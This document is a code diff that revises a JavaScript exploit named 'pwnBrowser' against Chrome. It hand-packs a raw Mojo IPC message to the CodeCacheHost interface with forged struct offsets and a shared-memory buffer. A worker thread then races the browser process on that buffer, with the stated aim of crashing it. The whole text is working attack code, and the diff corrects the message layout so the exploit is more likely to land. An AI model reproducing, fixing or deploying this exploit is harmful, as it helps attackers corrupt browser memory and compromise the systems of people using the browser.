@@ -11,13 +11,10 @@
         async function pwnBrowser() {
             console.log("[*] Creating raw Mojo Message Pipe...");
 
-            // 1. Create a raw IPC pipe
             const pipe = Mojo.createMessagePipe();
-            
-            // 2. Bind the Browser process to our pipe
             Mojo.bindInterface('blink.mojom.CodeCacheHost', pipe.handle1);
 
-            // 3. Allocate the Malicious Shared Memory (100KB)
+            // 1. Allocate the Malicious Shared Memory (100KB)
             const bufferSize = 100 * 1024;
             const sharedBuffer = Mojo.createSharedBuffer(bufferSize);
             const mapping = sharedBuffer.handle.mapBuffer(0, bufferSize);
@@ -29,62 +26,67 @@
 
             console.log("[*] Shared Memory ready. Spawning mutator...");
 
-            // 4. Spawn the Mutator Worker to race the Browser
+            // 2. Spawn the Mutator Worker to race the Browser
             const mutator = new Worker('mutator.js');
             mutator.postMessage({ buffer: mapping.buffer }, [mapping.buffer]);
 
             console.log("[*] Forging C++ Structs in memory...");
 
-            // 5. PACK THE RAW IPC MESSAGE (128 Bytes Total)
-            const msg = new ArrayBuffer(128);
+            // 3. PACK THE RAW IPC MESSAGE (136 Bytes Total)
+            const msg = new ArrayBuffer(136);
             const msgView = new DataView(msg);
 
-            // --- MOJO HEADER (16 Bytes) ---
-            msgView.setUint32(0, 128, true); // Total Message Size
-            msgView.setUint32(4, 0, true);   // Version
+            // --- MOJO MESSAGE HEADER (16 Bytes) ---
+            msgView.setUint32(0, 16, true);  // Header Size (Strictly 16)
+            msgView.setUint32(4, 0, true);   // Version 0
             msgView.setUint32(8, 0, true);   // Interface ID
             msgView.setUint32(12, 1, true);  // Message ID (1 = DidGenerateCacheableMetadata)
 
-            // --- PARAMS STRUCT (40 Bytes, starts at offset 16) ---
-            msgView.setUint32(16, 40, true); // Struct size
+            // --- PARAMS STRUCT (48 Bytes, starts at offset 16) ---
+            msgView.setUint32(16, 48, true); // Struct size (8 byte header + 40 bytes fields)
             msgView.setUint32(20, 0, true);  // Version
             msgView.setUint32(24, 0, true);  // CodeCacheType (0 = Javascript)
             msgView.setUint32(28, 0, true);  // Padding
-            msgView.setBigUint64(32, 24n, true); // Pointer to URL struct (Relative offset)
-            msgView.setBigUint64(40, 56n, true); // Pointer to Time struct (Relative offset)
             
-            // BigBuffer Union (Inline, 16 Bytes)
+            // Relative Pointer to URL struct (Placed at offset 64. Math: 64 - 32 = 32)
+            msgView.setBigUint64(32, 32n, true); 
+            // Relative Pointer to Time struct (Placed at offset 104. Math: 104 - 40 = 64)
+            msgView.setBigUint64(40, 64n, true); 
+
+            // BigBuffer Union (Inline at offset 48, 16 Bytes)
             msgView.setUint32(48, 16, true); // Union size
             msgView.setUint32(52, 1, true);  // Union tag (1 = shared_memory)
-            msgView.setBigUint64(56, 56n, true); // Pointer to SharedMemoryRegion struct
+            // Relative Pointer to SharedMemory struct (Placed at offset 120. Math: 120 - 56 = 64)
+            msgView.setBigUint64(56, 64n, true); 
 
-            // --- URL STRUCT (16 Bytes, starts at offset 56) ---
-            msgView.setUint32(56, 16, true); // Struct size
-            msgView.setUint32(60, 0, true);  // Version
-            msgView.setBigUint64(64, 8n, true); // Pointer to String data
+            // --- URL STRUCT (16 Bytes, starts at offset 64) ---
+            msgView.setUint32(64, 16, true); // Size
+            msgView.setUint32(68, 0, true);  // Version
+            // Relative Pointer to String data (Placed at offset 80. Math: 80 - 72 = 8)
+            msgView.setBigUint64(72, 8n, true); 
 
-            // --- STRING DATA (24 Bytes, starts at offset 72) ---
-            msgView.setUint32(72, 24, true); // Array size (8 byte header + 12 chars + padding)
-            msgView.setUint32(76, 12, true); // Number of characters
-            const urlStr = "http://a.com"; 
+            // --- STRING DATA (24 Bytes, starts at offset 80) ---
+            msgView.setUint32(80, 24, true); // Array size (8 header + 12 chars + 4 pad)
+            msgView.setUint32(84, 12, true); // Num chars
+            const urlStr = "http://a.com";
             for(let i = 0; i < 12; i++) {
-                msgView.setUint8(80 + i, urlStr.charCodeAt(i));
+                msgView.setUint8(88 + i, urlStr.charCodeAt(i));
             }
 
-            // --- TIME STRUCT (16 Bytes, starts at offset 96) ---
-            msgView.setUint32(96, 16, true); // Struct size
-            msgView.setUint32(100, 0, true); // Version
-            msgView.setBigUint64(104, 0n, true); // internal_value (0)
+            // --- TIME STRUCT (16 Bytes, starts at offset 104) ---
+            msgView.setUint32(104, 16, true);
+            msgView.setUint32(108, 0, true);
+            msgView.setBigUint64(112, 0n, true); // internal_value
 
-            // --- SHARED MEMORY REGION STRUCT (16 Bytes, starts at offset 112) ---
-            msgView.setUint32(112, 16, true); // Struct size
-            msgView.setUint32(116, 0, true);  // Version
-            msgView.setUint32(120, 0, true);  // Handle Index (Points to the 0th element in our handle array)
-            msgView.setUint32(124, bufferSize, true); // Buffer Size
+            // --- SHARED MEMORY REGION STRUCT (16 Bytes, starts at offset 120) ---
+            msgView.setUint32(120, 16, true);
+            msgView.setUint32(124, 0, true);
+            msgView.setUint32(128, 0, true); // Handle Index (Points to the 0th element in our handle array below)
+            msgView.setUint32(132, bufferSize, true); // Buffer Size
 
             console.log("[*] Firing Raw IPC Payload...");
 
-            // 6. FIRE THE MESSAGE directly down the pipe
+            // 4. FIRE THE MESSAGE
             pipe.handle0.writeMessage(msg, [sharedBuffer.handle]);
 
             console.log("[+] Payload Sent. If the race hits, Chrome will SIGSEGV.");
